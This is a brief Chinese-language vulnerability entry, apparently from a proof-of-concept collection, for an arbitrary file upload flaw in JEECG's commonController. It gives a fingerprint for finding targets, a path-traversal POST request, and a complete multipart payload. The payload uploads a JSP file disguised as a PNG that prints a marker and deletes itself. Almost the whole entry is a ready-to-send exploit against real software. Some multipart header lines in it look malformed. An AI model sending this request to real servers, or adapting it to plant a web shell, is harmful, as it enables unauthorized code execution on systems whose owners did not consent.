# JeecgcommonController任意文件上传漏洞

- **系统**：JeecgcommonController　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="JEECG"`
- **请求**：`POST /api/../commonController.do?parserXml HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei`

**请求体 / payload**
```
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; "name="name"
zW9YCa.png
------WebKitFormBoundarygcflwtei
ontent-Disposition: form-data; name="documentTitle"
blank
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="file"; filename="dudesite.jsp"
Content-Type: image/png
<% out.println("dudesite");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundarygcflwtei--
```
- **预期**：200　|　success